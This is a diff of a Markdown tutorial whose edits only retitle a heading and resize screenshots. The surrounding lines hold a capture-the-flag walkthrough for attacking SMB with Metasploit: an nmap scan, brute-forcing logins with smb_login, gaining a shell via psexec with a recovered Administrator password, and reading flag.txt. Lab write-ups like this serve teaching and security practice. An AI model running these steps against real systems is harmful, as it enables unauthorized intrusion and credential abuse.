@@ -436,10 +436,10 @@ A payload staged can be more stealthy and flexible than a payload non staged, as
 
 
 
-# Example of Metasploit Framework: Exploiting SMB
+# Example: Exploiting SMB with Metasploit Framework(MSF)
 ### Check SMB protocols with nmap
  - nmap -p445 --script smb-protocols 10.3.23.123 <br>
-<img src="smb.png" width=65% height="auto"><br><br>
+<img src="smb.png" width=50% height="auto"><br><br>
 ### Perform brute force
  - msfconsole -q && service postgresql start
  - use auxiliary/scanner/smb/smb_login
@@ -448,20 +448,20 @@ A payload staged can be more stealthy and flexible than a payload non staged, as
  - set RHOSTS 10.3.23.123
  - set VERBOSE false
  - exploit (4 valid credentials) <br>
- <img src="brute.png" width=65% height="auto"><br><br>
+ <img src="brute.png" width=50% height="auto"><br><br>
 ### Exploit with psexec modules
  - use exploit/windows/smb/psexec
  - set RHOSTS 10.3.23.123
  - set SMBUser Administrator
  - set SMBPass qwertyuiop
  - exploit <br>
-<img src="psexec.png" width=65% height="auto"><br><br>
+<img src="psexec.png" width=50% height="auto"><br><br>
 ### Capture the Flag
  - shell
  - cd /
  - dir
  - type flag.txt <br>
-<img src="flag.png" width=65% height="auto"><br><br>
+<img src="flag.png" width=50% height="auto"><br><br>
 
 
 #Author
